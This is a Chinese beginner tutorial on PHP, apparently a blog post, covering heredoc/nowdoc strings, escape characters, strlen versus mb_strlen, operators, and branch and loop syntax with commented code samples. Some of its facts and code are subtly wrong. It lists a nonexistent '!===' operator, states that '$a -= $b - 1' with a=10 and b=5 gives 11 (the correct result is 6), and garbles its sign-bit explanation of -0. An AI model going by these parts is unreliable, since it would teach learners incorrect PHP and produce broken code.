<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span> = &lt;&lt;&lt;边界符</span><br><span class="line">    字符串内容</span><br><span class="line">边界符;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//结构化定义</span></span><br><span class="line"><span class="comment">//nowdoc结构</span></span><br><span class="line"><span class="variable">$str3</span> = &lt;&lt;&lt;<span class="string">&#x27;EOD&#x27;</span></span><br><span class="line">	hello</span><br><span class="line">EOD;</span><br><span class="line"><span class="comment">//heredoc结构</span></span><br><span class="line"><span class="variable">$str4</span> = &lt;&lt;&lt;EOD</span><br><span class="line">	hello</span><br><span class="line">EOD;</span><br><span class="line">var_dump(<span class="variable">$str3</span>,<span class="variable">$str4</span>);		<span class="comment">//string(5) &quot;hello&quot;，string(5) &quot;hello&quot;</span></span><br></pre></td></tr></table></figure>
<p>nowdoc和heredoc比引号还是要区别多一点，它会保留代码的结构</p>
<p>结构化定义字符串变量的规则：</p>
<p>​    1、结构化定义字符串对应的边界符有条件：</p>
<p>​        1.1、上边界符后面不能跟任何内容（包括注释）</p>
<p>​        1.2、下边界符必须顶格</p>
<p>​        1.3、下边界符同样后面只能跟分号，不能跟任何内容；</p>
<p>​    2、结构化定义字符串的内部（边界符之间）的所有内容都是字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str1</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$str2</span> = &lt;&lt;&lt;EOD</span><br><span class="line">	<span class="comment">//这是弹出内容</span></span><br><span class="line">	&lt;script&gt;</span><br><span class="line">		alert(<span class="string">&#x27;$str1&#x27;</span>);		<span class="comment">//js弹出字符串必须要有引号</span></span><br><span class="line">	&lt;/script&gt;</span><br><span class="line">EOD;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str2</span>;</span><br></pre></td></tr></table></figure>
<p>以上的注释都被被当作字符串来输出</p>
<h4 id="字符串转义"><a href="#字符串转义" class="headerlink" title="字符串转义"></a>字符串转义</h4><p>转义：在计算机通用协议中，有以下特定的方式定义的字母，系统会特定处理：通常这种方式都是使用反斜杠+字母（单词）的特性：</p>
<p>\r\n：回车换行</p>
<p>PHP在识别转义字符的时候也是使用同样的模式：反斜杠+字母</p>
<p>在PHP中系统常用的转义符号：</p>
<p>\‘：在单引号字符串中显示单引号</p>
<p>\“：在双引号字符串中显示双引号</p>
<p>\r：代表回车（理论上是回到当前行的首位置）</p>
<p>\n：代表新一行</p>
<p>\t：类似tab键，输出4个空格</p>
<p>\$：在PHP中使用$符号作为变量符号，因此需要特定识别</p>
<p>单引号和双引号的区别：</p>
<p>​    1、其中单引号中能够识别\‘，而双引号中就不能识别\‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义字符串识别转义符号</span></span><br><span class="line"><span class="variable">$str1</span> = <span class="string">&#x27;abc\r\ndef\t\&#x27;\&quot;\$fg&#x27;</span>;</span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&quot;abc\r\ndef\t\&#x27;\&quot;\$fg&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str1</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>,<span class="variable">$str2</span>;		<span class="comment">//abc\r\ndef\t&#x27;\&quot;\$fg</span></span><br><span class="line">								<span class="comment">//abc def \&#x27;&quot;$fg</span></span><br></pre></td></tr></table></figure>
<p>​    2、双引号总因为能够识别$符号，索引双引号中可以解析变量，而单引号不能</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="comment">//变量识别</span></span><br><span class="line"><span class="variable">$str1</span> = <span class="string">&#x27;abc $a def&#x27;</span>;</span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&quot;abc <span class="subst">$a</span> def&quot;</span>;</span><br><span class="line"><span class="variable">$str3</span> = <span class="string">&#x27;abc$adef&#x27;</span>;</span><br><span class="line"><span class="variable">$str4</span> = <span class="string">&quot;abc<span class="subst">&#123;$a&#125;</span>def&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str1</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>,<span class="variable">$str2</span>;		<span class="comment">//abc $a def</span></span><br><span class="line">								<span class="comment">//abc hello def</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str3</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>,<span class="variable">$str4</span>;		<span class="comment">//abc$adef</span></span><br><span class="line">								<span class="comment">//abchellodef</span></span><br></pre></td></tr></table></figure>
<p>​        双引号中变量识别的规则</p>
<p>​            1、变量本身系统能够与后面的内容区分：应该保证变量的独立性，不要让系统难以区分</p>
<p>​            2、使用变量专业标识符（区分），给变量加上一组大括号{}</p>
<h4 id="字符串长度问题"><a href="#字符串长度问题" class="headerlink" title="字符串长度问题"></a>字符串长度问题</h4><p>​    1、基本函数strlen()：得到字符串的长度（字节为单位）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义字符串</span></span><br><span class="line"><span class="variable">$str1</span> = <span class="string">&#x27;abcdefj&#x27;</span>;</span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&#x27;你好中国123&#x27;</span>;			<span class="comment">//中文在utf-8字符集中占3个字节</span></span><br><span class="line"><span class="keyword">echo</span> strlen(<span class="variable">$str1</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>,strlen(<span class="variable">$str2</span>);		<span class="comment">//7,15</span></span><br></pre></td></tr></table></figure>
<p>​    2、多字节字符串的长度问题：包括中文的长度</p>
<p>​    3、多自己字符串扩展模块：mbstring扩展（mb：Multi Bytes）</p>
<p>​        首先要加载PHP的mbstring扩展（在配置文件中）</p>
<p>​        可以使用mb扩展带来的很多函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义字符串</span></span><br><span class="line"><span class="variable">$str1</span> = <span class="string">&#x27;abcdefj&#x27;</span>;</span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&#x27;你好中国123&#x27;</span>;			<span class="comment">//中文在utf-8字符集中占3个字节</span></span><br><span class="line"><span class="keyword">echo</span> mb_strlen(<span class="variable">$str1</span>),<span class="string">&#x27;&lt;br/&gt;&#x27;</span>,mb_strlen(<span class="variable">$str2</span>);		<span class="comment">//7,7</span></span><br></pre></td></tr></table></figure>
<p>​        mbstring扩展针对的是一些关于字符统计：strlen只是针对标准交换码ASCⅡ，mbstring会针对不同字符集</p>
<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>运算符：operator，是一种将数据进行运算的特殊符号，在PHP中一共有十种运算符</p>
<h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><p>赋值运算：符号是“=”，表示将右边的结果（可以是变量、数据、常量和其他运算出来的结果），保存到内粗你的某个位置，然后将位置的内存地址赋值给左侧的变量（常量）。</p>
<h3 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h3><p>算术运算：基本算术操作</p>
<p>+：执行数据累加</p>
<p>-：数据相减</p>
<p>*：两个数相乘</p>
<p>/：两个数相除</p>
<p>%：取余（模）运算，两个数（整型数）相除，保留余数</p>
<p>注意：在进行出发运算或者取余运算的时候，对应的被除数（第二个数）不能为0</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$b</span> = <span class="number">10</span>;		<span class="comment">//连贯赋值运算：两个不同变量</span></span><br><span class="line"><span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span> / <span class="number">0</span>);		<span class="comment">//错误，被除数不能为0，取余同理</span></span><br></pre></td></tr></table></figure>


<h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p>比较运算：比较两个数据的大小，或者两个内容是否相同，返回的结果都是布尔类型：满足返回true，不满足返回false</p>
<p>&gt;：左边大于右边，返回true</p>
<p>&gt;=：左边大于等于右边，返回true</p>
<p>&lt;：右边大于左边，返回true</p>
<p>&lt;=：右边大于等于左边，返回true</p>
<p>==：左边等于右边，返回true（大小相同）</p>
<p>!=：左边不等于右边，返回true（大小不同）</p>
<p>===：全等于，左边等于右边，返回true（大小以及数据的类型都要相同）</p>
<p>!===：不全等于，左边不等于右边，返回true（只要大小或者数据类型不同）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;123&#x27;</span>;		<span class="comment">//字符串</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">123</span>;		<span class="comment">//整型</span></span><br><span class="line">var_dump(<span class="variable">$a</span> == <span class="variable">$b</span>);		<span class="comment">//bool(true)</span></span><br><span class="line">var_dump(<span class="variable">$a</span> === <span class="variable">$b</span>);	<span class="comment">//bool(false)</span></span><br></pre></td></tr></table></figure>


<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>逻辑运算：针对不同的结果进行匹配。满足条件返回true，不满足返回false</p>
<p>&amp;&amp;：逻辑与，左边的条件与右边的条件同时成立（两边结果都为true）。</p>
<p>||：逻辑或，左边的条件与右边的条件只要有一个满足即可。</p>
<p>!：逻辑非，对已有条件进行取反，本身为true，取反结果为false</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;weekend&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;good&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span> == <span class="string">&#x27;weekend&#x27;</span> &amp;&amp; <span class="variable">$b</span> == <span class="string">&#x27;good&#x27;</span>);		<span class="comment">//bool(true)</span></span><br><span class="line">var_dump(<span class="variable">$a</span> == <span class="string">&#x27;weekend&#x27;</span> &amp;&amp; <span class="variable">$b</span> == <span class="string">&#x27;bad&#x27;</span>);		<span class="comment">//bool(false)</span></span><br><span class="line">var_dump(<span class="variable">$a</span> == <span class="string">&#x27;weekend&#x27;</span> || <span class="variable">$b</span> == <span class="string">&#x27;bad&#x27;</span>);		<span class="comment">//bool(true)</span></span><br><span class="line">var_dump(<span class="variable">$b</span> == <span class="string">&#x27;bad&#x27;</span>);		<span class="comment">//bool(false)</span></span><br><span class="line">var_dump(!(<span class="variable">$b</span> == <span class="string">&#x27;bad&#x27;</span>));		<span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure>
<p>逻辑与与逻辑或又称之为短路运算：如果第一个表达式结果已经满足条件了，那么就不会运行逻辑运算符后面的表达式：在书写代码的时候，尽量将出现概率最高的（能够直接判断出结果）的表达式放到第一位。</p>
<h3 id="连接运算符"><a href="#连接运算符" class="headerlink" title="连接运算符"></a>连接运算符</h3><p>链接运算：是PHP中将多个字符串拼接的一种符号</p>
<p>.：将两个字符串连接到一起</p>
<p>.=：复合运算，将左边的内容与右边的内容连接欸起来，然后重新赋值给左边变量（A .= B  ==== A = A . B）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span> . <span class="variable">$b</span>;		<span class="comment">//hello123，将a变量和b变量连接起来</span></span><br><span class="line"><span class="variable">$a</span> .= <span class="variable">$b</span>;		<span class="comment">//$a = $a . $b</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;		<span class="comment">//hello123</span></span><br></pre></td></tr></table></figure>


<h3 id="错误抑制符"><a href="#错误抑制符" class="headerlink" title="错误抑制符"></a>错误抑制符</h3><p>在PHP中有一些错误可以提前预知，但是这些错误可能无法避免，但是又不希望报错为用户看，可以使用错误抑制符处理。</p>
<p>@：在可能出错的表达式前面使用“@”符号即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$a</span> / <span class="variable">$b</span>；		<span class="comment">//报错</span></span><br><span class="line">@(<span class="variable">$a</span> / <span class="variable">$b</span>);		<span class="comment">//不会报错</span></span><br></pre></td></tr></table></figure>
<p>错误抑制符通常在生产环境（上线）会用到，在开发的时候不会用：系统本身最好没有任何错误。</p>
<h3 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h3><p>三目运算：有三个表达式参与的运算（简单的分支结构缩写）</p>
<p>语法格式：</p>
<p>表达式1 ? 表达式2 :表达式3；</p>
<p>运算：如果表达式1成立，那么执行表达式2，否则执行表达式3；</p>
<p>注意：如果表达式本身比较复杂，建议使用括号括起来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$a</span> &gt; <span class="number">10</span> ? <span class="number">100</span> : <span class="number">0</span>;		<span class="comment">//b--&gt;0</span></span><br></pre></td></tr></table></figure>
<p>三目运算可以进行复合三目运算：三目运算中的表达式2和3都是可以是另外一个三目运算。</p>
<p>表达式1 ? (表达式2 ? 表达式4 ：表达式5) ：(表达式3 ? 表达式6 : 表达式7);</p>
<h3 id="自操作运算符"><a href="#自操作运算符" class="headerlink" title="自操作运算符"></a>自操作运算符</h3><p>自操作：自己操作自己的运算符</p>
<p>++：在原来的值上+1</p>
<p>–：在原来的值上-1</p>
<p>在PHP中自操作运算符是可以放到变量前或者后：前置自操作和后置自操作</p>
<p>前置或者后置如果本身只有自操作，不参与其他运算（自操作同时），那么效果是一样的。但是自操作同时还参与别的运算，那么效果就不一样。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$b</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$a</span>++;		<span class="comment">//a--&gt;2，c--&gt;1 </span></span><br><span class="line"><span class="variable">$d</span> = ++<span class="variable">$b</span>;		<span class="comment">//b--&gt;2，d--&gt;2</span></span><br></pre></td></tr></table></figure>
<p>后置自操作：先把自己所保存的值留下来，然后改变自己，自己给别人的值是原来的值；</p>
<p>前置自操作：先把自己改变，然后把改变后的值给别人；</p>
<p>衍生符号：类似自操作</p>
<p>+=：左边的结果与右边的结果相加，然后赋值给左边</p>
<p>-=：左边的结果与右边的结果相减，然后赋值给左边</p>
<p>*=：左边的结果与右边的结果相乘，然后赋值给左边</p>
<p>/=：左边的结果除以右边的结果，然后赋值给左边</p>
<p>%=：左边的结果对右边的结果取模，然后赋值给左边</p>
<p>注意：右边是一个整体 $a -= $b - 1;  ==== $a = $a - ($b - 1);</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">5</span>;</span><br><span class="line"><span class="variable">$a</span> -= <span class="variable">$b</span> - <span class="number">1</span>;		<span class="comment">//a--&gt;11</span></span><br></pre></td></tr></table></figure>
<p>如果进行除法或者取余运算，那么要考虑右边表达式的结果是否为0（为0出错）</p>
<h3 id="计算机码"><a href="#计算机码" class="headerlink" title="计算机码"></a>计算机码</h3><p>计算机码：计算机在实际存储数据的时候，采用的编码规则（二进制规则）</p>
<p>计算机码：原码、反码和补码，数值本身最左边一位是用来充当符号位：正数为0，负数为1</p>
<p>原码：数据本身从十进制转换为二进制得到的结果</p>
<p>​        正数：左边符号位为0（整数的原码、反码和补码就是原码本身）</p>
<p>​        负数：左边符号位为1</p>
<p>反码：针对负数，符号位不变，其他位取反</p>
<p>补码：针对负数，反码+1</p>
<p>系统中存在两个0：+0和-0</p>
<p>+0：00000000</p>
<p>-0：10000000    原码</p>
<p>取反 11111111</p>
<p>补码 00000000</p>
<h3 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h3><p>位运算：取出计算机中最小的单位（位bit）进行运算</p>
<p>&amp;：按位与，两个位都为1，结果为1，否则为0</p>
<p>|：按位或，两个位有一个为1，结果为1，否则为0</p>
<p>~：按位非，一个位如果为1则变成0，否则反之</p>
<p>^：按位异或，两个位相同则为0，不同则为1</p>
<p>&lt;&lt;：按位左移，整个位（32位），向左移动一位，右边补0（乘以2的操作）</p>
<p>&gt;&gt;：按位右移，整个位向右移动一位，左边补符号位对应内容（整数补0，负数补1）（除以2的操作，不完全正确，整数除2出出现小数）</p>
<p>注意：</p>
<p>​    1、系统进行任何位运算的时候都是使用的补码</p>
<p>​    2、运算结束之后都必须转换成原码才是最终要显示的数据</p>
<h3 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h3><p>运算符优先级：在多种运算符同时存在的时候，如何结合运算</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210120164418503.png" alt="image-20210120164418503"></p>
<h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><p>流程控制：代码执行的方向</p>
<h3 id="控制分类"><a href="#控制分类" class="headerlink" title="控制分类"></a>控制分类</h3><p>顺序结构：代码从上往下，顺序执行。（代码执行的最基本结构）</p>
<p>分支结构：给定一个条件，同时又多种可执行代码（块），然后会根据条件执行某一段代码</p>
<p>循环结构：在某个条件控制范围内，指代的代码（块）可重复执行</p>
<h3 id="顺序结构"><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h3><p>顺序结构：最基本结构，所有代码默认都是从上往下依次执行</p>
<h3 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h3><p>在PHP中，分支结构主要又两种：if分支和switch分支</p>
<h4 id="if分支"><a href="#if分支" class="headerlink" title="if分支"></a>if分支</h4><p>if：如果的意思，给定一个条件，同时为该条件设置多种（两种）情况，然后通过条件判断来实现具体的执行段</p>
<p>基本语法：if分支PHP也提供多种方式来实现</p>
<p>最简if：只有一段代码，但是可以选择是否执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(条件表达式)&#123;</span><br><span class="line">	<span class="comment">//满足条件所要执行的内容;//顺序结构</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>基础if：有两面性，满足条件或者不满足调剂都有对应的执行代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(条件表达式)&#123;</span><br><span class="line">	<span class="comment">//满足条件后执行的代码段;</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="comment">//不满足条件执行的代码段;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>复杂if结构：在判断条件之后，通常就有两种结果：满足或者不满足，在不满足之后还可以再次进行条件判断</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(条件表达式<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="comment">//满足条件表达式1的代码段;</span></span><br><span class="line">&#125;<span class="keyword">elseif</span>(条件表达式<span class="number">2</span>)&#123;</span><br><span class="line">	<span class="comment">//不满足表达式1条件，但是满足表达式2的代码;</span></span><br><span class="line">&#125;...	<span class="comment">//可以使用多个elseif来进行再次条件筛选</span></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="comment">//全部不满足要执行的代码;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意：如果条件特别多才会采用复合if形式</p>
<p>​    1、如果条件比较单一（同一个条件），会采用elseif方式</p>
<p>​    2、如果判断条件不一致，建议使用嵌套语法（不宜采用太多层嵌套：影响代码美观）</p>
<p>if分支，适用于所有的条件判断（分支结构）</p>
<h4 id="switch分支"><a href="#switch分支" class="headerlink" title="switch分支"></a>switch分支</h4><p>switch分支：有一组情形存在，通过一条件，通常由多个值，但是每一个值都会有对应不同的代码要执行。</p>
<p>switch判断方式：是将条件放到分支结构内部判断</p>
<p>switch基本语法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>(条件表达式)&#123;</span><br><span class="line">        <span class="comment">//所有条件判断：逐个进行</span></span><br><span class="line">    <span class="keyword">case</span> 值<span class="number">1</span>:	<span class="comment">//当前条件表达式的结果与值1相等（==）</span></span><br><span class="line">        <span class="comment">//要执行的代码段;</span></span><br><span class="line">        <span class="keyword">break</span>;	<span class="comment">//在switch中，如果条件匹配成功，那么系统就不会再次匹配条件，会自动顺序执行向下的所有代码（case代码除外），break表示中断switch（结束）</span></span><br><span class="line">    <span class="keyword">case</span> 值<span class="number">2</span>:</span><br><span class="line">        <span class="comment">//要执行的代码段;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="comment">//可以使用类似else的语法：都不匹配</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">//匹配失败的代码</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>if和switch的选择：</p>
<p>​    1、if能做所有的分支结构事情</p>
<p>​    2、switch处理的是条件比较多，同时比较单一，而且是固定匹配的分支结构</p>
<h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><p>循环结构：代码段在一定的控制下，可以多次执行</p>
<p>在PHP中循环结构有以下几种：</p>
<p>for循环：通过条件、起始和终止判断执行</p>
<p>while循环通过判断条件终止</p>
<p>do-while循环：跟while差不多</p>
<p>foreach循环：专门针对数组</p>
<h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p>for循环基本语法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(条件表达式<span class="number">1</span>;条件表达式<span class="number">2</span>;条件表达式<span class="number">3</span>)&#123;</span><br><span class="line">    <span class="comment">//条件表达式1：定义初始化条件，可以有多种赋值语句存在，使用都好分隔即可</span></span><br><span class="line">    <span class="comment">//条件表达式2：边界判定，限定循环执行的次数</span></span><br><span class="line">    <span class="comment">//条件表达式3：用来执行条件变化</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//从1到10输出：初始为1，结果为10</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">1</span>;<span class="variable">$i</span> &lt;= <span class="number">10</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="comment">//输出</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$i</span>;		<span class="comment">//11,最后i为11</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//从1到10输出（10通常是动态得到）</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">1</span>,<span class="variable">$end</span> = <span class="number">10</span>;<span class="variable">$i</span> &lt;= <span class="variable">$end</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="comment">//输出</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>for循环执行原理：</p>
<p>​    1、执行条件表达式1：定义初始化条件（执行一次）</p>
<p>​    2、执行条件表达式2：判断条件（N次）</p>
<p>​        2.1满足条件：执行循环体</p>
<p>​        2.2不满足条件：循环结束</p>
<p>​    3、执行循环体：（N次）</p>
<p>​    4、执行条件表达式3：循环变量变化（N次）</p>
<p>​    5、执行条件表达式2：判断条件（N次）</p>
<p>​    6、重复执行3-4-2步骤：直到第2部不满足条件结束循环</p>
<p>for循环中条件表达式1的多变量定义</p>
<p>for循环特殊使用：for循环中对应的括号（条件）可以一个都没有（死循环）；一定要避免出现</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    循环体；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><p>while循环基本语法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">条件初始化;</span><br><span class="line"><span class="keyword">while</span>(条件表达式)&#123;</span><br><span class="line">    <span class="comment">//条件表达式就是判断边界条件</span></span><br><span class="line">    循环体；		<span class="comment">//循环条件的变化</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义条件</span></span><br><span class="line"><span class="variable">$i</span> = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//定义判定执行</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$i</span> &lt;= <span class="number">10</span>)&#123;</span><br><span class="line">    <span class="comment">//循环体</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//循环条件变更</span></span><br><span class="line">    <span class="variable">$i</span>++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>for与while的选择</p>
<p>​    1、如果是基于固定已知条件（数值而且是有规律的变化），使用for循环</p>
<p>​    2、while可以做灵活的调减判定（while使用得比较多）</p>
<h3 id="do-while循环"><a href="#do-while循环" class="headerlink" title="do-while循环"></a>do-while循环</h3><p>do-while：看着很想while，while首先进行条件判定然后执行循环体，有可能出现第一次就条件不满足，那么就会直接失败（循环体一次都不执行）。do-while就是先干了再说（执行循环体），然后判断条件。（至少会执行一次循环体）</p>
<p>do-while基本语法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="comment">//循环体</span></span><br><span class="line">&#125;<span class="keyword">while</span>(条件表达式);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//输出1-10之间得偶数（条件判定加入）</span></span><br><span class="line"><span class="comment">//定义基础条件</span></span><br><span class="line"><span class="variable">$i</span> = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//循环判定</span></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="comment">//执行输出</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$i</span> % <span class="number">2</span> != <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">//是偶数</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$i</span>++,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//条件变更</span></span><br><span class="line">    <span class="variable">$i</span>++;</span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="variable">$i</span> &lt;= <span class="number">10</span>);</span><br></pre></td></tr></table></figure>


<h3 id="循环控制"><a href="#循环控制" class="headerlink" title="循环控制"></a>循环控制</h3><p>循环控制：在循环内部对循环本身进行控制</p>
<p>中断控制：重新开始循环，循环体中还有其他内容，也再执行</p>
<p>​    continue层级；    //默认是1（循环可以多层嵌套）</p>
<p>终止控制：循环直接结束</p>
<p>​    break层级；    默认是1</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//需求：输出1-100之间5的倍数</span></span><br><span class="line"><span class="variable">$i</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$i</span> &lt;= <span class="number">100</span>)&#123;</span><br><span class="line">    <span class="comment">//判断：是否是5的倍数</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$i</span> % <span class="number">5</span> != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//说明当前$i不是5的倍数</span></span><br><span class="line">        <span class="comment">//重新循环</span></span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">        <span class="keyword">continue</span>;	<span class="comment">//系统重新跳到开始循环处</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//输出数值</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span>++,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为循环经常性会碰到嵌套（循环中间包含循环），如果再循环内部有些条件下，明确可以知道当前循环（或者说外部循环）不需要继续执行了，那么就是可以使用循环控制类实现：其中内部循环也可以控制到外部，就是通过使用层级参数。</p>
<p>​    continue 2;    //当前自己循环后面内部不再执行，同时外部循环如果还有循环体也不再执行，重新来过；</p>
<p>​    break 2;        //当前自己循环结束，同时外部也结束（如果还有外部不受影响，继续执行）</p>
<h3 id="流程控制替代语法"><a href="#流程控制替代语法" class="headerlink" title="流程控制替代语法"></a>流程控制替代语法</h3><p>流程控制替代语法：分支和循环结构的替代语法。</p>
<p>PHP本事是嵌入到HTML中的脚本语言，需要再HTML中书写一些关于判断或者循环的结构语法，必须符合PHP标签规范，需要HTML与PHP进行混搭，如果使用原始的PHP代码那么会非常不美观。</p>
